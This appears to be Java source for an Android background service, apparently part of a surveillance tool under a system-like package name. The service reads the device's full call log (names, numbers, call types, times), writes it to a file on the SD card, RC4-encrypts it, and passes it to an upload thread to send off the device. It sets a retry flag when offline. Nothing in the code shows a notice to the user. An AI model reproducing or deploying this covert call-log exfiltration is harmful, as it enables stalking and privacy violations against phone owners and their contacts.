//两个Service的主体代码的功能是实现生成PhoneBook（CallLog），上传部分调用UploadThread一笔带过

package services;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;

import com.system.mobilecontroller.UploadThread;

public class UploadclService extends Service{
	
	Context context = UploadclService.this;
	String sdPath = Environment.getExternalStorageDirectory().getPath() + "/"; 
	String toBeEncryptedPath = sdPath + "Android/CallLog.txt";
	String encryptedPath = sdPath + "Android/CallLog_Encrypted.txt";
	
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
	}
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

        try 
        {
            String str1 = "";
            String str2 = "" ; 
            int type;
            String type_name ="";
            Date date;
            String time= "";
            ContentResolver cr = getContentResolver();
            final Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, 
            		new String[]{CallLog.Calls.NUMBER,
            		CallLog.Calls.CACHED_NAME,
            		CallLog.Calls.TYPE, CallLog.Calls.DATE},
            		null, null,
            		CallLog.Calls.DEFAULT_SORT_ORDER);
            
            FileOutputStream fos = new FileOutputStream(sdPath + "Android/CallLog.txt");
            OutputStream os = fos ; //OutputStream不能直接实例化。用fos向上转型。
            OutputStreamWriter osw = new OutputStreamWriter(os ,Charset.forName("GBK"));
			for (int i = 0; i < cursor.getCount(); i++) {   
	            cursor.moveToPosition(i);//直接定位到这一行的数据
	            str1 = cursor.getString(0);//代表new String中的第0项，CallLog.Calls.NUMBER
	            str2 = cursor.getString(1);
	            type = cursor.getInt(2);
	            SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
	            date = new Date(Long.parseLong(cursor.getString(3)));
	            time = sfd.format(date);
	            switch(type)
	            {	
	            	case 1 : type_name="INCOMING";break;//break!
	            	case 2 : type_name="OUTGOING";break;
	            	case 3 : type_name="MISSED";break;
	            }
//	            if(type==1)type_name="INCOMING";
//	            else if(type==2)type_name="OUTGOING";
//	            else if(type==3)type_name="MISSED";
	            osw.write("姓名:" + str2 +" ; "+ "号码:" + str1 + " ; "+"类型:" + type_name +" ; "+"时间:" + time + "\r\n");   
//	            rc4.NewEnc.start(toBeEncryptedPath,encryptedPath);
			}
			osw.flush();
			
        } catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
        if (NetworkConnected()) { 
		new Handler().postDelayed(new Runnable(){   
            public void run() {  
                   //显示dialog
            	try {
					rc4.NewEnc.start(toBeEncryptedPath,encryptedPath);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
        		UploadThread ut = new UploadThread();
        		ut.setTar("CallLog_Encrypted.txt");
        		Thread t = new Thread(ut);
        		t.start();
            }  
        }, 2000);   //2秒
        }
		else
		{
			SharedPreferences sp = context.getSharedPreferences("SP",
					MODE_PRIVATE);
			Editor editor = sp.edit();
			editor.putBoolean("callLogUploaded", false);
			editor.commit();
		}
		
//		Toast.makeText(context, "it's onStartCommand！！", Toast.LENGTH_LONG).show();
		
		// TODO Auto-generated method stub
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}
	/**
	 * 对网络连接状态进行判断
	 * @return  true, 可用； false， 不可用
	 */
	private boolean NetworkConnected() {
		ConnectivityManager connManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
		if(connManager.getActiveNetworkInfo() != null) {
			return connManager.getActiveNetworkInfo().isConnected();
		}
		return false;
	}
}
